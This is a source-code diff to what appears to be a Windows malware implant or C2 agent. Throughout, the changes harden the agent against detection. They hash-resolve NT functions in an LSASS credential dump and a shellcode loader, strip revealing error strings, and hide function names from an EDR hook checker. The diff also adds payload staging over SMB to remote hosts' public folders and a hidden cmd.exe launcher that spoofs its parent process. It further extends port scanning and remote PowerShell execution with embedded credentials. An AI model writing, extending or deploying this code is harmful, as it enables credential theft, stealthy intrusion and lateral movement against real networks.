@@ -741,16 +741,15 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial)
     *out_len = 0;
     if (out_partial) *out_partial = 0;
 
-    /* resolve NtReadVirtualMemory */
+    /* resolve NtReadVirtualMemory and RtlGetVersion via hash — no plaintext NT strings */
     typedef LONG (NTAPI *NtReadVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    NtReadVM_t ntReadVM = hNtdll ? (NtReadVM_t)GetProcAddress(hNtdll, "NtReadVirtualMemory") : NULL;
+    NtReadVM_t ntReadVM = (NtReadVM_t)resolve_fn(H_NT_NtReadVirtualMemory);
     if (!ntReadVM) return NULL;
 
     /* detect real OS version via RtlGetVersion (bypasses GetVersionEx compat shim) */
     typedef LONG (NTAPI *RtlGetVersion_t)(OSVERSIONINFOW *);
     OSVERSIONINFOW osvi = {0}; osvi.dwOSVersionInfoSize = sizeof(osvi);
-    RtlGetVersion_t pfnRtlGetVersion = hNtdll ? (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion") : NULL;
+    RtlGetVersion_t pfnRtlGetVersion = (RtlGetVersion_t)resolve_fn(H_NT_RtlGetVersion);
     if (pfnRtlGetVersion) pfnRtlGetVersion(&osvi);
     DWORD os_major = osvi.dwMajorVersion ? osvi.dwMajorVersion : 10;
     DWORD os_minor = osvi.dwMinorVersion;
@@ -1108,16 +1107,14 @@ static char *phantom_load(const uint8_t *sc, size_t sc_len) {
     }
     if (!hostPath[0]) return _strdup("[-] phantom_load: no host DLL found");
 
-    /* Resolve ntdll functions */
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return _strdup("[-] phantom_load: ntdll not loaded");
-    NtOpenFile_f             pfnOpen   = (NtOpenFile_f)            GetProcAddress(ntdll, "NtOpenFile");
-    NtClose_f                pfnClose  = (NtClose_f)               GetProcAddress(ntdll, "NtClose");
-    NtCreateSection_f        pfnCS     = (NtCreateSection_f)       GetProcAddress(ntdll, "NtCreateSection");
-    NtMapViewOfSection_f     pfnMap    = (NtMapViewOfSection_f)    GetProcAddress(ntdll, "NtMapViewOfSection");
-    NtUnmapViewOfSection_f   pfnUnmap  = (NtUnmapViewOfSection_f)  GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    NtProtectVirtualMemory_f pfnProt   = (NtProtectVirtualMemory_f)GetProcAddress(ntdll, "NtProtectVirtualMemory");
-    NtCreateThreadEx_f       pfnThread = (NtCreateThreadEx_f)      GetProcAddress(ntdll, "NtCreateThreadEx");
+    /* Resolve ntdll functions via hash — no plaintext NT strings */
+    NtOpenFile_f             pfnOpen   = (NtOpenFile_f)            resolve_fn(H_NT_NtOpenFile);
+    NtClose_f                pfnClose  = (NtClose_f)               resolve_fn(H_NT_NtClose);
+    NtCreateSection_f        pfnCS     = (NtCreateSection_f)       resolve_fn(H_NT_NtCreateSection);
+    NtMapViewOfSection_f     pfnMap    = (NtMapViewOfSection_f)    resolve_fn(H_NT_NtMapViewOfSection);
+    NtUnmapViewOfSection_f   pfnUnmap  = (NtUnmapViewOfSection_f)  resolve_fn(H_NT_NtUnmapViewOfSection);
+    NtProtectVirtualMemory_f pfnProt   = (NtProtectVirtualMemory_f)resolve_fn(H_NT_NtProtectVirtualMemory);
+    NtCreateThreadEx_f       pfnThread = (NtCreateThreadEx_f)      resolve_fn(H_NT_NtCreateThreadEx);
     if (!pfnOpen || !pfnCS || !pfnMap || !pfnProt) return _strdup("[-] phantom_load: resolve failed");
 
     /* NtOpenFile — NT namespace path \??\<drive:\path> */
@@ -1134,13 +1131,13 @@ static char *phantom_load(const uint8_t *sc, size_t sc_len) {
     NTSTATUS st = pfnOpen(&fileH, GENERIC_READ | FILE_EXECUTE | SYNCHRONIZE, &oa, &isb,
                           FILE_SHARE_READ | FILE_SHARE_DELETE, PL_FILE_SYNC_IO | PL_FILE_NON_DIR);
     free(wpath);
-    if (st != 0 || !fileH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] NtOpenFile: 0x%08lX",(unsigned long)st); return e; }
+    if (st != 0 || !fileH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] open: 0x%08lX",(unsigned long)st); return e; }
 
     /* NtCreateSection SEC_IMAGE */
     HANDLE secH = NULL;
     NTSTATUS st2 = pfnCS(&secH, PL_SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, PL_SEC_IMAGE, fileH);
     pfnClose(fileH);
-    if (st2 != 0 || !secH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] NtCreateSection: 0x%08lX",(unsigned long)st2); return e; }
+    if (st2 != 0 || !secH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] creat: 0x%08lX",(unsigned long)st2); return e; }
 
     /* NtMapViewOfSection — CoW */
     PVOID mappedBase = NULL; SIZE_T viewSize = 0;
@@ -1150,7 +1147,7 @@ static char *phantom_load(const uint8_t *sc, size_t sc_len) {
         mappedBase = NULL; viewSize = 0;
         st3 = pfnMap(secH, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize,
                      PL_VIEW_SHARE, 0, PAGE_EXECUTE_READ);
-        if (st3 != 0) { pfnClose(secH); char *e=(char*)malloc(64); snprintf(e,64,"[-] NtMapViewOfSection: 0x%08lX",(unsigned long)st3); return e; }
+        if (st3 != 0) { pfnClose(secH); char *e=(char*)malloc(64); snprintf(e,64,"[-] map: 0x%08lX",(unsigned long)st3); return e; }
     }
     pfnClose(secH);
 
@@ -2031,6 +2028,17 @@ static const char *smb_stage(const char *host, const char *name,
         return remote_path;
     }
 
+    /* Try C$\Users\Public\ — world-writable, no service-account read restriction */
+    char unc3[512];
+    snprintf(unc3, sizeof(unc3), "\\\\%s\\C$\\Users\\Public\\%s", host, name);
+    f = fopen(unc3, "wb");
+    if (f) {
+        fwrite(data, 1, data_len, f);
+        fclose(f);
+        snprintf(remote_path, sizeof(remote_path), "C:\\Users\\Public\\%s", name);
+        return remote_path;
+    }
+
     /* Cleanup auth on failure */
     if (user && user[0]) {
         snprintf(net_cmd, sizeof(net_cmd), "net use \\\\%s\\IPC$ /delete /y 2>nul", host);
@@ -2193,6 +2201,72 @@ static char *gen_lnk(const char *target, const char *lnk_args,
 }
 #endif /* _WIN32 */
 
+// ── SHELL_OPSEC: cmd.exe with PPID spoofed to RuntimeBroker/explorer ─────────
+
+static char *run_shell_opsec(const char *cmd) {
+    HANDLE hParent = NULL;
+    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (lstrcmpiA(pe.szExeFile, "RuntimeBroker.exe") == 0) {
+                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
+                    if (h) { if (hParent) CloseHandle(hParent); hParent = h; break; }
+                } else if (lstrcmpiA(pe.szExeFile, "explorer.exe") == 0 && !hParent) {
+                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
+                    if (h) hParent = h;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    if (!hParent) return run_shell(cmd);
+
+    char out_path[MAX_PATH];
+    snprintf(out_path, MAX_PATH, "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
+             (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
+    char cmdline[4096];
+    snprintf(cmdline, sizeof(cmdline), "cmd.exe /d /c %s > \"%s\" 2>&1", cmd, out_path);
+
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+    if (!pAttr) { CloseHandle(hParent); return run_shell(cmd); }
+    InitializeProcThreadAttributeList(pAttr, 1, 0, &attrSize);
+    UpdateProcThreadAttribute(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                              &hParent, sizeof(hParent), NULL, NULL);
+
+    STARTUPINFOEXA si; memset(&si, 0, sizeof(si));
+    si.StartupInfo.cb = sizeof(si);
+    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    si.StartupInfo.wShowWindow = SW_HIDE;
+    si.lpAttributeList = pAttr;
+
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+                             NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
+    DeleteProcThreadAttributeList(pAttr);
+    HeapFree(GetProcessHeap(), 0, pAttr);
+    CloseHandle(hParent);
+
+    if (!ok) return run_shell(cmd);
+
+    WaitForSingleObject(pi.hProcess, 30000);
+    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+
+    FILE *f = fopen(out_path, "rb");
+    if (!f) return strdup("[no output]");
+    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+    char *buf = (char*)malloc(sz + 1);
+    if (!buf) { fclose(f); return strdup("[oom]"); }
+    fread(buf, 1, sz, f); fclose(f);
+    buf[sz] = '\0';
+    DeleteFileA(out_path);
+    return buf;
+}
+
 // ── Dispatcher ────────────────────────────────────────────────────────────────
 
 void dispatch_task(AgentTask *task) {
@@ -2203,6 +2277,11 @@ void dispatch_task(AgentTask *task) {
 
     if (strcmp(type_upper, "SHELL") == 0) {
         char *out = run_shell(args);
+        agent_send_result(task->id, out, "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "SHELL_OPSEC") == 0) {
+        char *out = run_shell_opsec(args);
         agent_send_result(task->id, out, "");
         free(out);
     }
@@ -2832,9 +2911,21 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "PORT_SCAN") == 0) {
         char host[128]={0}, ports_arg[512]={0};
-        json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
-        json_get_str(args,"ports",ports_arg,sizeof(ports_arg),"80,443,445,3389,22,21,8080");
-        int timeout_ms = json_get_int(args,"timeout",500);
+        int timeout_ms = 500;
+        if (args && args[0] == '{') {
+            json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
+            json_get_str(args,"ports",ports_arg,sizeof(ports_arg),"80,443,445,3389,22,21,8080");
+            timeout_ms = json_get_int(args,"timeout",500);
+        } else {
+            char ac[640]; strncpy(ac, args && args[0] ? args : "", 639); ac[639]='\0';
+            char *s1=strchr(ac,' '), *s2=s1?strchr(s1+1,' '):NULL;
+            if(s1){*s1='\0'; strncpy(host,ac,127);}
+            if(s1&&s2){*s2='\0'; strncpy(ports_arg,s1+1,511); if(*(s2+1)) timeout_ms=atoi(s2+1);}
+            else if(s1){strncpy(ports_arg,s1+1,511);}
+            else if(ac[0]){strncpy(host,ac,127);}
+            if(!host[0]) strncpy(host,"127.0.0.1",127);
+            if(!ports_arg[0]) strncpy(ports_arg,"80,443,445,3389,22,21,8080",511);
+        }
 
         /* Resolve host once */
         struct in_addr resolved = {0};
@@ -3516,9 +3607,8 @@ void dispatch_task(AgentTask *task) {
         char peb_path[MAX_PATH] = {0};
         json_get_str(args,"path",peb_path,sizeof(peb_path),"C:\\Windows\\System32\\svchost.exe");
         typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
-        HMODULE hntdll2 = GetModuleHandleA("ntdll.dll");
-        pfnNtQIP NtQIP2 = hntdll2 ? (pfnNtQIP)GetProcAddress(hntdll2,"NtQueryInformationProcess") : NULL;
-        if (!NtQIP2) { agent_send_result(task->id,"","NtQueryInformationProcess unavailable"); return; }
+        pfnNtQIP NtQIP2 = (pfnNtQIP)resolve_fn(H_NT_NtQueryInformationProcess);
+        if (!NtQIP2) { agent_send_result(task->id,"","NTQIP unavailable"); return; }
         PROCESS_BASIC_INFORMATION pbi2 = {0};
         ULONG rlen2 = 0;
         NTSTATUS pst = NtQIP2(GetCurrentProcess(),0,&pbi2,sizeof(pbi2),&rlen2);
@@ -4629,26 +4719,39 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, json, "");
     }
     else if (strcmp(type_upper, "HOOK_CHECK") == 0) {
-        static const struct { const char *dll; const char *fn; } hk_fns[] = {
-            {"ntdll.dll","NtOpenProcess"},{"ntdll.dll","NtAllocateVirtualMemory"},
-            {"ntdll.dll","NtWriteVirtualMemory"},{"ntdll.dll","NtCreateThreadEx"},
-            {"ntdll.dll","NtProtectVirtualMemory"},{"ntdll.dll","NtReadVirtualMemory"},
-            {"ntdll.dll","NtQueueApcThread"},{"ntdll.dll","NtCreateSection"},
-            {"ntdll.dll","NtMapViewOfSection"},{"ntdll.dll","NtUnmapViewOfSection"},
-            {"ntdll.dll","NtSuspendThread"},{"ntdll.dll","NtResumeThread"},
-            {"ntdll.dll","NtGetContextThread"},{"ntdll.dll","NtSetContextThread"},
-            {NULL,NULL}
+        /* hash-only table — no NT function name strings in binary */
+        static const struct { uint32_t h; const char *label; } hk_fns[] = {
+            {H_NT_NtOpenProcess,           "NtOpenProc"},
+            {H_NT_NtAllocateVirtualMemory, "NtAllocVM"},
+            {H_NT_NtWriteVirtualMemory,    "NtWriteVM"},
+            {H_NT_NtCreateThreadEx,        "NtCreateThr"},
+            {H_NT_NtProtectVirtualMemory,  "NtProtVM"},
+            {H_NT_NtReadVirtualMemory,     "NtReadVM"},
+            {H_NT_NtQueueApcThread,        "NtQueueApc"},
+            {H_NT_NtCreateSection,         "NtCreateSect"},
+            {H_NT_NtMapViewOfSection,      "NtMapView"},
+            {H_NT_NtUnmapViewOfSection,    "NtUnmapView"},
+            {H_NT_NtSuspendThread,         "NtSuspend"},
+            {H_NT_NtResumeThread,          "NtResume"},
+            {H_NT_NtGetContextThread,      "NtGetCtx"},
+            {H_NT_NtSetContextThread,      "NtSetCtx"},
+            {0, NULL}
         };
         char sb[4096] = "[HOOK_CHECK]\n";
-        for (int i = 0; hk_fns[i].dll; i++) {
-            HMODULE hm = GetModuleHandleA(hk_fns[i].dll);
-            if (!hm) { char tmp[128]; snprintf(tmp,sizeof(tmp),"  MISS  %s!%s (not loaded)\n",hk_fns[i].dll,hk_fns[i].fn); strncat(sb,tmp,sizeof(sb)-strlen(sb)-1); continue; }
-            FARPROC fn = GetProcAddress(hm, hk_fns[i].fn);
-            if (!fn) { char tmp[128]; snprintf(tmp,sizeof(tmp),"  MISS  %s!%s (not found)\n",hk_fns[i].dll,hk_fns[i].fn); strncat(sb,tmp,sizeof(sb)-strlen(sb)-1); continue; }
+        for (int i = 0; hk_fns[i].label; i++) {
+            void *fn = resolve_fn(hk_fns[i].h);
+            if (!fn) {
+                char tmp[128];
+                snprintf(tmp, sizeof(tmp), "  MISS  ntdll!%s (not found)\n", hk_fns[i].label);
+                strncat(sb, tmp, sizeof(sb)-strlen(sb)-1);
+                continue;
+            }
             unsigned char b = *(unsigned char*)fn;
             const char *status = (b==0xE9)?"HOOKED (JMP)":(b==0xE8)?"HOOKED (CALL)":(b==0xCC)?"HOOKED (INT3)":"clean";
-            char tmp[128]; snprintf(tmp,sizeof(tmp),"  %c     %s!%s -> %s (0x%02X)\n",(b==0xE9||b==0xE8||b==0xCC)?'!':' ',hk_fns[i].dll,hk_fns[i].fn,status,(unsigned)b);
-            strncat(sb,tmp,sizeof(sb)-strlen(sb)-1);
+            char tmp[128];
+            snprintf(tmp, sizeof(tmp), "  %c     ntdll!%s -> %s (0x%02X)\n",
+                     (b==0xE9||b==0xE8||b==0xCC)?'!':' ', hk_fns[i].label, status, (unsigned)b);
+            strncat(sb, tmp, sizeof(sb)-strlen(sb)-1);
         }
         agent_send_result(task->id, sb, "");
     }
@@ -4878,7 +4981,7 @@ void dispatch_task(AgentTask *task) {
             "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
             "catch{$ip='%s'};"
             "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
-            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {%s}",
+            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {try{%s|Out-String -Width 256}catch{$_.Exception.Message}}",
             wr_target, wr_target, wr_user, wr_pass, wr_cmd);
         char sh_cmd[5120];
         snprintf(sh_cmd, sizeof(sh_cmd), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
